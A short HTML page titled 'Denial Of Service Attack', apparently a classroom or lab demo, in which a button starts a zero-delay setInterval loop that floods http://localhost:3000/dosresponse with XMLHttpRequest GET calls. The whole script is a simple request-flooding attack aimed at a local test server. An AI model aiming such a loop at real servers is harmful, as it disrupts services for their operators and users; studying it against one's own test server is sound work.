<!DOCTYPEhtml>

<html>
    <head>
        <title>Denial Of Service Attack</title>
    </head>
    <body>
        <div id="header"></div>
        <button id="requestbutton">Send </button>
        <script>
            
            var button = document.getElementById("requestbutton");
            button.onclick = function(){
                sendRequest();
            } 

            function GoToServer(){
                var httpRequest = new XMLHttpRequest();
                httpRequest.onreadystatechange = function(){
                    if(httpRequest.readyState == XMLHttpRequest.DONE){
                        if(httpRequest.status == 200){
                            console.log(httpRequest.responseText);
                        }
                    }
                }
                httpRequest.open('GET', "http://localhost:3000/dosresponse", true);
                httpRequest.send();
            }
            function sendRequest(){
                setInterval(GoToServer,0.0000000000001);
            }
        </script>
    </body>
</html>
